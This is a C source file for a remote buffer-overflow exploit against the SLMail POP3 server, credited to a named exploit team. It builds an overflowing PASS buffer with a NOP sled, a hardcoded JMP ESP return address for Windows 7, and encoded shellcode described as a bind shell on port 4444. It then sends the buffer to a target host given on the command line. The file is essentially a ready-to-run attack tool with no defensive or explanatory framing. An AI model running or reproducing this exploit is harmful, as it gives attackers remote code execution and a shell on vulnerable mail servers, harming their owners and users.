/*
SLMAIL REMOTE PASSWD BOF - Ivan Ivanovic Ivanov Иван-дурак
недействительный 31337 Team
*/

#include <string.h>
#include <stdio.h>
#include <winsock2.h>
#include <windows.h>

// [*] bind 4444 
unsigned char shellcode[] = 
    "\xda\xc0\xd9\x74\x24\xf4\xba\x7d\x50\x1f\xec\x5e\x33\xc9\xb1"
    "\x52\x31\x56\x17\x03\x56\x17\x83\x93\xac\xfd\x19\x97\xa5\x80"
    "\xe2\x67\x36\xe5\x6b\x82\x07\x25\x0f\xc7\x38\x95\x5b\x85\xb4"
    "\x5e\x09\x3d\x4e\x12\x86\x32\xe7\x99\xf0\x7d\xf8\xb2\xc1\x1c"
    "\x7a\xc9\x15\xfe\x43\x02\x68\xff\x84\x7f\x81\xad\x5d\x0b\x34"
    "\x41\xe9\x41\x85\xea\xa1\x44\x8d\x0f\x71\x66\xbc\x9e\x09\x31"
    "\x1e\x21\xdd\x49\x17\x39\x02\x77\xe1\xb2\xf0\x03\xf0\x12\xc9"
    "\xec\x5f\x5b\xe5\x1e\xa1\x9c\xc2\xc0\xd4\xd4\x30\x7c\xef\x23"
    "\x4a\x5a\x7a\xb7\xec\x29\xdc\x13\x0c\xfd\xbb\xd0\x02\x4a\xcf"
    "\xbe\x06\x4d\x1c\xb5\x33\xc6\xa3\x19\xb2\x9c\x87\xbd\x9e\x47"
    "\xa9\xe4\x7a\x29\xd6\xf6\x24\x96\x72\x7d\xc8\xc3\x0e\xdc\x85"
    "\x20\x23\xde\x55\x2f\x34\xad\x67\xf0\xee\x39\xc4\x79\x29\xbe"
    "\x2b\x50\x8d\x50\xd2\x5b\xee\x79\x11\x0f\xbe\x11\xb0\x30\x55"
    "\xe1\x3d\xe5\xfa\xb1\x91\x56\xbb\x61\x52\x07\x53\x6b\x5d\x78"
    "\x43\x94\xb7\x11\xee\x6f\x50\x14\xe4\x6f\x18\x40\xf8\x6f\x5c"
    "\x2d\x75\x89\x36\x5d\xd0\x02\xaf\xc4\x79\xd8\x4e\x08\x54\xa5"
    "\x51\x82\x5b\x5a\x1f\x63\x11\x48\xc8\x83\x6c\x32\x5f\x9b\x5a"
    "\x5a\x03\x0e\x01\x9a\x4a\x33\x9e\xcd\x1b\x85\xd7\x9b\xb1\xbc"
    "\x41\xb9\x4b\x58\xa9\x79\x90\x99\x34\x80\x55\xa5\x12\x92\xa3"
    "\x26\x1f\xc6\x7b\x71\xc9\xb0\x3d\x2b\xbb\x6a\x94\x80\x15\xfa"
    "\x61\xeb\xa5\x7c\x6e\x26\x50\x60\xdf\x9f\x25\x9f\xd0\x77\xa2"
    "\xd8\x0c\xe8\x4d\x33\x95\x08\xac\x91\xe0\xa0\x69\x70\x49\xad"
    "\x89\xaf\x8e\xc8\x09\x45\x6f\x2f\x11\x2c\x6a\x6b\x95\xdd\x06"
    "\xe4\x70\xe1\xb5\x05\x51";

void exploit(int sock) {
    int *ptr;
    char userbuf[] = "USER user\r\n";
    char evil[3001];
    char buf[3012];
    char receive[1024];
    char nopsled[] = "\x90\x90\x90\x90\x90\x90\x90\x90"
                   "\x90\x90\x90\x90\x90\x90\x90\x90";
    
    memset(buf, 0x00, 3012);
    memset(evil, 0x00, 3001);
    memset(evil, 0x43, 2606);
    ptr = &evil;
    ptr = ptr + 652; // 2608 
    memcpy(ptr, &nopsled, 16);
    ptr = ptr + 4;
    memcpy(ptr, &shellcode, 351);
    *(long*)&evil[2606] = 0x5f4b41e3; // JMP ESP win7 0x5f4b41e3
    
    // banner
    recv(sock, receive, 200, 0);
    printf("[+] %s", receive);
    
    // user
    printf("[+] Sending Username...\n");
    send(sock, userbuf, strlen(userbuf), 0);
    recv(sock, receive, 200, 0);
    printf("[+] %s", receive);
    
    // passwd
    printf("[+] Sending Evil buffer...\n");
    sprintf(buf, "PASS %s\r\n", evil);

    send(sock, buf, strlen(buf), 0);
    printf("[*] Done! Connect to the host on port 4444...\n\n");
}

int connect_target(char *host, u_short port)
{
    int sock = 0;
    struct hostent *hp;
    WSADATA wsa;
    struct sockaddr_in sa;

    WSAStartup(MAKEWORD(2,0), &wsa);
    memset(&sa, 0, sizeof(sa));

    hp = gethostbyname(host);
    if (hp == NULL) {
        printf("gethostbyname() error!\n"); exit(0);
    }
    printf("[+] Connecting to %s\n", host);
    sa.sin_family = AF_INET;
    sa.sin_port = htons(port);
    sa.sin_addr = **((struct in_addr **) hp->h_addr_list);

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0)      {
        printf("[-] socket blah?\n");
        exit(0);
        }
    if (connect(sock, (struct sockaddr *) &sa, sizeof(sa)) < 0)
        {printf("[-] connect() blah!\n");
        exit(0);
          }
    printf("[+] Connected to %s\n", host);
    return sock;
}


int main(int argc, char **argv)
{
    int sock = 0;
    int data, port;
    printf("\n[$] SLMail Server POP3 PASSWD Buffer Overflow exploit\n");
    printf("[$] by Mad Ivan [ void31337 team ] - http://exploit.void31337.ru\n\n");
    if ( argc < 2 ) { printf("usage: slmail-ex.exe <host> \n\n"); exit(0); }
    port = 110;
    sock = connect_target(argv[1], port);
    exploit(sock);
    closesocket(sock);
    return 0;
}
